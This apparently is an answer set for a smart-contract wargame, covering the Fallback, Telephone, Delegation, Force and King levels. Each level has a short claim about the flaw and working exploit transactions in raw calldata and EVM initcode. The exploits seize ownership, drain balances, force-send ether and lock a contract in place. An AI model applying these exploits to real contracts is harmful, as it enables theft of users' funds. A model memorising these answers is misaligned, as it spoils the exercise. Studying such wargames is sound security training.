## Fallback
Claim: Contribute a small amount to register a contribution, send ether directly to trigger `receive()` and become owner, then call `withdraw()` to drain the instance.
```json
[
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0xd7bb99ba", "value": "100000000000000"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x", "value": "100000000000000"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x3ccfd60b", "value": "0"}
]
```

## Telephone
Claim: Deployed initcode calls `changeOwner(player)`, so `tx.origin` is the player EOA while `msg.sender` is the new contract, satisfying the ownership-change check.
```json
[
  {"to": null, "data": "0x7fa6f9dae100000000000000000000000000000000000000000000000000000000005f527320000000000000000000000000000000000000026004525f5f60245f5f73d3264fed42a0dc00663d0aa2b0abb90a19b347f25af15f5ff3", "value": "0"}
]
```

## Delegation
Claim: Sending the `pwn()` selector triggers Delegation's fallback, which delegatecalls Delegate in Delegation's storage context, setting its owner slot to the player.
```json
[
  {"to": "0x1780ddd8723ddc88d5def27cc1dfb16a73077434", "data": "0xdd365b8b", "value": "0"}
]
```

## Force
Claim: Funded initcode immediately self-destructs to the Force instance in its creation transaction, forcibly transferring ether despite Force having no payable code.
```json
[
  {"to": null, "data": "0x73d3264fed42a0dc00663d0aa2b0abb90a19b347f2ff", "value": "1000000000000000"}
]
```

## King
Claim: Deployed reverting contract sends the prize to become king; validation's later transfer to it reverts, preventing the factory from reclaiming kingship.
```json
[
  {"to": null, "data": "0x5f5f5f5f6700038d7ea4c6800073d3264fed42a0dc00663d0aa2b0abb90a19b347f25af16003602e5f3960035ff35f5ffd", "value": "2000000000000000"}
]
```